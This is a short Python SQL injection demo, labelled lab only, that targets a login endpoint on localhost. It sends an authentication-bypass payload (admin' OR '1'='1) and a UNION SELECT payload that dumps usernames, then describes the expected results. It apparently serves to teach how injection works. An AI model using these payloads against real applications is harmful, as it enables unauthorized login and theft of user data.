# exploit_demo.py (lab only)
import requests

TARGET = "http://127.0.0.1:5000/login"

def bypass_login():
    # Classic boolean-based SQLi: set username to something that makes the WHERE true
    payload = {
        "username": "admin' OR '1'='1",
        "password": "whatever"
    }
    r = requests.get(TARGET, params=payload, timeout=5)
    print("Bypass attempt response:")
    print(r.text)

def leak_users_count():
    # Try a UNION-based leak (sqlite requires column count match; we try to fetch username via UNION)
    # The vulnerable app returns id, username -> two columns, so we can craft a matching UNION payload
    payload = {
        "username": "x' UNION SELECT 1, group_concat(username, ';') FROM users --",
        "password": "irrelevant"
    }
    r = requests.get(TARGET, params=payload, timeout=5)
    print("\nUnion-leak attempt response:")
    print(r.text)

if __name__ == "__main__":
    print("Running SQLi demo against", TARGET)
    bypass_login()
    leak_users_count()


Expected behavior:

bypass_login() will likely return "Authenticated as ..." because OR '1'='1' makes the WHERE true.

leak_users_count() uses a UNION SELECT (two columns) and group_concat to dump user names; it should show usernames separated by ; if the app prints the resulting "username" column.